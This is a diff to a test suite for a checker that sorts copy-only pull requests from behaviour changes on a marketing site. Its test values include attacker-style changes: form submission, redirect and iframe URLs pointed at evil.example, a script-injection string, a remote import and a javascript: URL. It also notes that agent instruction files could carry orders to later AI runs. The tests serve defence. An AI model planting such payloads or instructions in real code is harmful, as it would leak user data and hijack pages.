@@ -59,7 +59,7 @@ export const DEADLINE = '2027-01-15';
 `;
 
 async function same(before: string, after: string, fileName = 'hero.tsx') {
-  return differsOnlyInContent(before, after, fileName);
+  return differsOnlyInContent(before, after, fileName, policy);
 }
 
 describe('differsOnlyInContent: copy edits', () => {
@@ -294,6 +294,152 @@ describe('differsOnlyInContent: changes of behaviour', () => {
   });
 });
 
+// Round 2 of the review of PR #704: values in data objects that are
+// identifiers, links or knobs passed because their keys were not on the
+// knob list. Each case is shaped like a real file in the marketing repo.
+describe('differsOnlyInContent: values that are not words', () => {
+  const object = (fields: string) => `export const DS_APPLY = { ${fields} } as const;`;
+
+  it.each([
+    ['a course type sent with the lead', "courseType: 'certification-data-science'", "courseType: 'btech_in_cs'"],
+    ['a URL slug', "urlSlug: 'data-science-ad-lp'", "urlSlug: 'ncet-su-website'"],
+    ['a lead source tag', "from: 'download_brochure_2'", "from: 'organic'"],
+    ['which form a button opens', "mode: 'rcb', heading: 'Download'", "mode: 'signup', heading: 'Download'"],
+    ['a typo in a union member', "mode: 'rcb', heading: 'Download'", "mode: 'rbc', heading: 'Download'"],
+    ['a button identifier under any key', "APPLY: 'conversion-banner-apply-cta-nl'", "APPLY: 'x'"],
+    ['a utm page identifier', "utmPageIdentifier: 'gen_ai_masterclass'", "utmPageIdentifier: 'other'"],
+    ['a route slug', "slug: 'bangalore'", "slug: 'bengaluru'"],
+    [
+      'a site verification token',
+      "googleSiteVerification: 'xTFfnMXNgFr_JAp60AHE'",
+      "googleSiteVerification: 'ATTACKER_TOKEN'",
+    ],
+    [
+      'a qualifier answer sent with the lead',
+      "label: 'Undergraduate', value: 'Undergraduate'",
+      "label: 'Undergraduate', value: 'Postgraduate'",
+    ],
+    ['an SEO path', "path: '/', tempPath: '/temp'", "path: '/temp', tempPath: '/'"],
+    ['a seat limit', "maxSeats: 30, label: 'x'", "maxSeats: 0, label: 'x'"],
+    [
+      'a fetch URL',
+      "heading: 'Apply', submitTo: 'https://api.newton/lead'",
+      "heading: 'Apply', submitTo: 'https://evil.example/lead'",
+    ],
+    ['a redirect path', "successPath: '/thank-you'", "successPath: 'https://evil.example'"],
+    ['a next URL', "next: '/thank-you'", "next: 'https://evil.example'"],
+    ['a form action', "formAction: '/submit'", "formAction: 'https://evil.example'"],
+    ['an iframe source', "signupIframe: 'https://forms.example/a'", "signupIframe: 'https://evil.example/phish'"],
+    ['an embed source', "formEmbed: 'https://forms.example/a'", "formEmbed: 'https://evil.example/phish'"],
+    ['a one-word value under a key that holds no words', "track: 'certification'", "track: 'btech'"],
+  ])('turns down %s', async (_case, before, after) => {
+    expect(await same(object(before), object(after), 'content.ts')).toBe(false);
+  });
+
+  it.each([
+    [
+      'a host allowlist',
+      "const WHATSAPP_HOSTS = ['wa.me', 'wa.link'];",
+      "const WHATSAPP_HOSTS = ['evil.example', 'wa.link'];",
+    ],
+    ['an exported list of one-word values', "export default ['wa.me'];", "export default ['evil.example'];"],
+    [
+      'a default-exported destination',
+      "export default { destination: 'https://a' };",
+      "export default { destination: 'https://evil' };",
+    ],
+    [
+      'an override after a spread',
+      "const BASE = { heading: 'a' }; export const X = { ...BASE, courseType: 'ds' };",
+      "const BASE = { heading: 'a' }; export const X = { ...BASE, courseType: 'web' };",
+    ],
+    [
+      'an object passed as a copy prop',
+      "export const A = () => <Hero primaryCta={{ label: 'Apply', from: 'hero_apply', mode: 'rcb' }} />;",
+      "export const A = () => <Hero primaryCta={{ label: 'Apply', from: 'other', mode: 'signup' }} />;",
+    ],
+    [
+      'an object as JSX children',
+      "export const A = () => <Provider>{{ submitTo: 'https://a' }}</Provider>;",
+      "export const A = () => <Provider>{{ submitTo: 'https://evil' }}</Provider>;",
+    ],
+    [
+      'a script built from a closed string',
+      "export const X = { label: 'Apply' };",
+      "export const X = { label: \"'+top.location.assign('//evil.example')+'\" };",
+    ],
+    [
+      'a link to the site itself, which its lint forbids',
+      "export const NEWS = [{ title: 'Startups', href: 'https://yourstory.com/a' }];",
+      "export const NEWS = [{ title: 'Startups', href: 'https://www.newtonschool.co/apply' }];",
+    ],
+  ])('turns down %s', async (_case, before, after) => {
+    expect(await same(before, after, 'a.tsx')).toBe(false);
+  });
+
+  it.each([
+    ['a stat', "stat: '93%'", "stat: '98.3%'"],
+    ['a fee', "fee: '₹1.3L'", "fee: '₹1.5L'"],
+    ['a count', "learners: '50,000+'", "learners: '60,000+'"],
+    ['a closing date', "closesOn: '2026-11-30'", "closesOn: '2027-01-15'"],
+    ['a phone link', "phoneHref: 'tel:+91-6366275707'", "phoneHref: 'tel:+91-9999999999'"],
+    ['a one-word label', "label: 'Apply'", "label: 'Enroll'"],
+    ['a one-word button', "ctaText: 'Apply'", "ctaText: 'Register'"],
+    ['a company name', "company: 'Google'", "company: 'Microsoft'"],
+    ['an image link', "heroImage: 'https://cdn.example.com/a.png'", "heroImage: 'https://cdn.example.com/b.png'"],
+    ['a video link', "videoUrl: 'https://www.youtube.com/embed/abc'", "videoUrl: 'https://www.youtube.com/embed/def'"],
+    ['a CTA link', "ctaHref: '/apply'", "ctaHref: '/apply-now'"],
+    [
+      'an image in a map of images',
+      "images: { hero: 'https://cdn.example.com/a.png' }",
+      "images: { hero: 'https://cdn.example.com/b.png' }",
+    ],
+    ['an outside article link', "href: 'https://yourstory.com/a'", "href: 'https://yourstory.com/b'"],
+  ])('keeps %s as content', async (_case, before, after) => {
+    expect(await same(object(before), object(after), 'content.ts')).toBe(true);
+  });
+
+  it.each([
+    [
+      'copy with a semicolon',
+      "export const X = { body: 'Learn Python, master SQL' };",
+      "export const X = { body: 'Learn Python; master SQL' };",
+    ],
+    [
+      'JSX text with a character reference',
+      'export const A = () => <h2>Industry&rsquo;s Top Experts</h2>;',
+      'export const A = () => <h2>Industry&rsquo;s Best Experts</h2>;',
+    ],
+    [
+      'a JSX template around a number',
+      'export const A = ({ n }: { n: number }) => <p>{`Only ${n} seats left`}</p>;',
+      'export const A = ({ n }: { n: number }) => <p>{`Just ${n} seats left`}</p>;',
+    ],
+    [
+      'a one-word heading prop',
+      'export const A = () => <Hero heading="Apply" />;',
+      'export const A = () => <Hero heading="Enroll" />;',
+    ],
+    [
+      'a file that names <iframe> only in a comment',
+      "/** Signup form embedded as an <iframe>. */\nexport const X = { heading: 'Old' };",
+      "/** Signup form embedded as an <iframe>. */\nexport const X = { heading: 'New' };",
+    ],
+    [
+      'a sentence that ends in the word document',
+      "export const X = { body: 'See the end of the document.' };",
+      "export const X = { body: 'See the end of this document.' };",
+    ],
+  ])('keeps %s as content', async (_case, before, after) => {
+    expect(await same(before, after, 'a.tsx')).toBe(true);
+  });
+
+  it('still turns down a comment-only mention once the file really renders an iframe', async () => {
+    const before = "/** <iframe> */\nexport const A = () => <iframe src='/a' title='Old' />;";
+    expect(await same(before, before.replace("'Old'", "'New'"))).toBe(false);
+  });
+});
+
 describe('looksLikeCode and isActiveUrl', () => {
   it.each([
     'Total ₹ 1.5L* (inclusive of taxes)',
@@ -303,6 +449,13 @@ describe('looksLikeCode and isActiveUrl', () => {
     '12 Jan – 15 Feb 2027',
     'Fees&nbsp;₹1.5L',
     'Learn how a function works',
+    'Fees: ₹1,49,999; EMI available',
+    'Mon–Fri; 7–9 PM',
+    'Q&A; live',
+    'Industry&rsquo;s Top Experts',
+    "Four profile images and one with '1k+' text on black",
+    'See the end of the document.',
+    'Score <90%',
   ])('reads %j as copy', text => {
     expect(looksLikeCode(text)).toBe(false);
   });
@@ -311,11 +464,14 @@ describe('looksLikeCode and isActiveUrl', () => {
     '</script><script>',
     '<b>bold</b>',
     'a{b}',
-    'x;y',
     '() => 1',
     'document.cookie',
     'fetch(url)',
     'function (){}',
+    "top.location='//evil'",
+    'import("//evil.example/x.js")',
+    "'+top.location.assign('//evil.example')+'",
+    'javascript&colon;alert(1)',
   ])('reads %j as code', text => {
     expect(looksLikeCode(text)).toBe(true);
   });
@@ -383,16 +539,51 @@ describe('isContentPath', () => {
     ['src/features/x/content.json', false],
     ['src/features/x/types.d.ts', false],
     ['package.json', false],
+    // Round 2: experiments, events, utm, gtag, redirects, codes, payments, consent and settings.
+    ['src/features/data-science-ns-v4/hero-inbound-experiment.ts', false],
+    ['src/features/x/Hero-Experiment.ts', false],
+    ['src/features/x/funnel/qualify.tsx', false],
+    ['src/features/x/redirects.ts', false],
+    ['src/features/x/redirect.tsx', false],
+    ['src/features/x/routes.ts', false],
+    ['src/features/x/events.ts', false],
+    ['src/features/x/utm.ts', false],
+    ['src/components/analytics/utm-propagation.tsx', false],
+    ['src/features/x/gtag.ts', false],
+    ['src/features/x/otp.tsx', false],
+    ['src/features/x/payment.tsx', false],
+    ['src/features/x/checkout.tsx', false],
+    ['src/features/x/consent.tsx', false],
+    ['src/features/x/env.ts', false],
+    ['src/features/x/constants.ts', false],
+    ['src/features/x/json-ld.tsx', false],
+    ['src/features/x/structured-data.tsx', false],
+    ['src/features/x/schema.ts', false],
+    ['src/features/x/instrumentation.ts', false],
+    ['src/app/(landing)/x/opengraph-image.tsx', false],
+    ['src/app/(landing)/x/sitemap.ts', false],
+    ['src/features/x/SESSION.ts', false],
+    // Copy that only looks like a denied word.
+    ['src/features/nst-fest/sections/events.tsx', true],
+    ['src/features/x/sections/course-description.tsx', true],
+    ['src/features/x/sections/footprint.tsx', true],
   ])('%s → %s', (filePath, expected) => {
     expect(isContentPath(filePath, policy)).toBe(expected);
   });
 
-  // A feature's own notes never ship to the site; 8 of 29 recent miniOG copy
-  // PRs touched one alongside the copy.
+  // A feature's own notes never ship to the site. Agent instructions do not
+  // count: a later run would read them as orders.
   it.each([
-    ['src/features/nst-home/CLAUDE.md', true],
     ['src/features/nst-apply/_design/REHOST-CAMPUS-AMENITIES.md', true],
     ['src/features/x/README.md', true],
+    ['src/features/x/notes.MD', true],
+    ['src/features/nst-home/CLAUDE.md', false],
+    ['src/features/nst-shell/PAGES-CLAUDE.md', false],
+    ['src/features/data-science-ns-v5/_design/reference/hero-sequence/AGENTS.md', false],
+    ['src/features/x/skills/SKILL.md', false],
+    ['src/features/x/.claude/notes.md', false],
+    ['src/features/x/forms/README.md', false],
+    ['src/features/x/gate/README.md', false],
     ['CLAUDE.md', false],
     ['AGENTS.md', false],
     ['src/app/(landing)/newton-school-of-technology-nst/placement/CLAUDE.md', false],
@@ -563,7 +754,7 @@ describe('checkContentOnlyPr', () => {
   });
 
   it("passes a copy edit with the feature's notes, without reading the notes", async () => {
-    const note = 'src/features/agentic-ai-course/CLAUDE.md';
+    const note = 'src/features/agentic-ai-course/README.md';
     const routes = copyEdit();
     const fetcher = github({
       ...routes,
@@ -571,11 +762,12 @@ describe('checkContentOnlyPr', () => {
     });
 
     expect(await check(fetcher)).toEqual({ contentOnly: true, files: [PATH, note], headSha: 'HEAD' });
-    expect(fetcher.mock.calls.some(call => String(call[0]).includes('CLAUDE.md'))).toBe(false);
+    expect(fetcher.mock.calls.some(call => String(call[0]).includes('README.md'))).toBe(false);
   });
 
   it.each([
-    ['an added note', ['src/features/x/CLAUDE.md', 'added']],
+    ['an added note', ['src/features/x/README.md', 'added']],
+    ["the feature's agent instructions", ['src/features/agentic-ai-course/CLAUDE.md', 'modified']],
     ['a removed note', ['src/features/x/README.md', 'removed']],
     ['a renamed note', ['src/features/x/README.md', 'renamed']],
     ['the root CLAUDE.md', ['CLAUDE.md', 'modified']],
